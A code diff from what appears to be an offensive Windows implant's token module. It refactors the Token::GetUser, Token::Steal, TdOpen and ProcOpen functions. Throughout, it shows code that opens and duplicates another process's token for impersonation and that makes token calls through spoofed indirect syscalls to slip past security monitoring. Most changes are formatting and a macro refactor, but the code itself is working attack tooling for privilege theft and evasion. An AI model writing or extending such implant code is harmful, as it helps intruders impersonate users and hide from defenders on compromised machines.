@@ -42,12 +42,12 @@ auto DECLFN Token::GetUser(
     }
 
     TokenUserPtr = ( PTOKEN_USER )hAlloc( ReturnLen );
-    if ( !TokenUserPtr ) {
+    if ( ! TokenUserPtr ) {
         goto _KH_END;
     }
 
     NtStatus = Self->Ntdll.NtQueryInformationToken( TokenHandle, TokenUser, TokenUserPtr, ReturnLen, &ReturnLen );
-    if ( !NT_SUCCESS( NtStatus ) ) { 
+    if ( ! NT_SUCCESS( NtStatus ) ) { 
         goto _KH_END; 
     }
 
@@ -342,9 +342,8 @@ auto DECLFN Token::Steal(
         }
     }
 
-    if ( !this->ProcOpen( ProcessHandle,
-        TOKEN_DUPLICATE | TOKEN_QUERY,
-        &TokenHandle ) || TokenHandle == INVALID_HANDLE_VALUE ) {
+    if ( ! this->ProcOpen( 
+        ProcessHandle, TOKEN_DUPLICATE | TOKEN_QUERY, &TokenHandle ) || TokenHandle == INVALID_HANDLE_VALUE ) {
         goto _KH_END;
     }
 
@@ -352,13 +351,9 @@ auto DECLFN Token::Steal(
     ProcessHandle = INVALID_HANDLE_VALUE;
 
     if ( Self->Advapi32.DuplicateTokenEx(
-        TokenHandle,
-        MAXIMUM_ALLOWED,
-        nullptr,
-        SecurityImpersonation,
-        TokenImpersonation,
-        &TokenDuplicated ) 
-    ) {
+        TokenHandle, MAXIMUM_ALLOWED, nullptr,
+        SecurityImpersonation, TokenImpersonation, &TokenDuplicated 
+    ) ) {
         Self->Ntdll.NtClose( TokenHandle );
         TOKEN_NODE* result = this->Add( TokenDuplicated, ProcessID );
         return result;
@@ -410,20 +405,15 @@ auto DECLFN Token::TdOpen(
     const UINT32 Flags = Self->Config.Syscall;
     NTSTATUS Status = STATUS_UNSUCCESSFUL;
 
-    if ( Flags == SYSCALL_NONE || !Flags ) {
+    if ( ! Flags ) {
         BOOL result = Self->Advapi32.OpenThreadToken(
             ThreadHandle, RightsAccess, OpenAsSelf, TokenHandle
         );
         return result;
     }
 
-    UPTR Address = (Flags == SYSCALL_SPOOF_INDIRECT)
-        ? (UPTR)Self->Sys->Ext[Sys::OpenThToken].Instruction
-        : (UPTR)Self->Ntdll.NtOpenThreadTokenEx;
-
-    UPTR ssn = (Flags == SYSCALL_SPOOF_INDIRECT)
-        ? (UPTR)Self->Sys->Ext[Sys::OpenThToken].ssn
-        : 0;
+    UPTR Address = SYS_ADDR( Sys::OpenThToken );
+    UPTR ssn = SYS_SSN( Sys::OpenThToken );
 
     Status = Self->Spf->Call(
         Address, ssn, (UPTR)ThreadHandle, (UPTR)RightsAccess,
@@ -442,20 +432,15 @@ auto DECLFN Token::ProcOpen(
     const UINT32 Flags  = Self->Config.Syscall;
     NTSTATUS     Status = STATUS_UNSUCCESSFUL;
 
-    if ( Flags == SYSCALL_NONE ) {
+    if ( ! Flags ) {
         BOOL result = Self->Advapi32.OpenProcessToken(
             ProcessHandle, RightsAccess, TokenHandle
         );
         return result;
     }
 
-    UPTR Address = ( Flags == SYSCALL_SPOOF_INDIRECT )
-        ? (UPTR)Self->Sys->Ext[Sys::OpenPrToken].Instruction
-        : (UPTR)Self->Ntdll.NtOpenProcessTokenEx;
-
-    UPTR ssn = ( Flags == SYSCALL_SPOOF_INDIRECT )
-        ? (UPTR)Self->Sys->Ext[Sys::OpenPrToken].ssn
-        : 0;
+    UPTR Address = SYS_ADDR( Sys::OpenPrToken );
+    UPTR ssn = SYS_SSN( Sys::OpenPrToken );
 
     Status = Self->Spf->Call(
         Address, ssn, (UPTR)ProcessHandle, (UPTR)RightsAccess,
